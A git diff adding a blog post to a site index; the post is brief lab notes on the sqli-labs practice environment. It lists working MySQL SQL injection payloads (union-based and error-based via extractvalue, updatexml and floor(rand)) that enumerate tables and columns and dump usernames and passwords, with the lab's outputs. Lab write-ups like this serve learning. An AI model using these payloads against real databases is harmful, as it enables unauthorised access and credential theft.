@@ -152,6 +152,74 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-sqli-labs" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/25/sqli-labs/">sqli-labs</a>
+    </h1>
+  
+
+        
+        <a href="/2022/03/25/sqli-labs/" class="archive-article-date">
+  	<time datetime="2022-03-24T16:02:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>And1&#x3D;2 order by column<br>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() –+ password为 emails，referers，uagents，users</p>
+<p>‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;”users” –+ password为id username password</p>
+<p>union select 1,2,concat(id,username,password) from users –+ 显示login name2，password 1dumbdumb</p>
+<p>extractvalue(1,concat(0x7e,(select user())),0x7e)))–+<br>and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) –+ 报错 rootlocalhost</p>
+<p>and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information schema.tables group by x)y)–+<br>and(select extractvalue(1,concat(0x7e,(select database())))) –+ 报错security</p>
+<p>And(select extractvalue(1,concat(0x7e,,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())))) –+ 报错 emails，erferers，uagents，users<br>And 1&#x3D;2 union select 1,2,3–+ login name 2.password 3<br>第二关与第一个基本一致，但是在?id&#x3D;1后面不需要加一个单引号<br>第三关应该在?id&#x3D;1后面加一个单引号和一个）</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/03/25/sqli-labs/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-hello-world" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
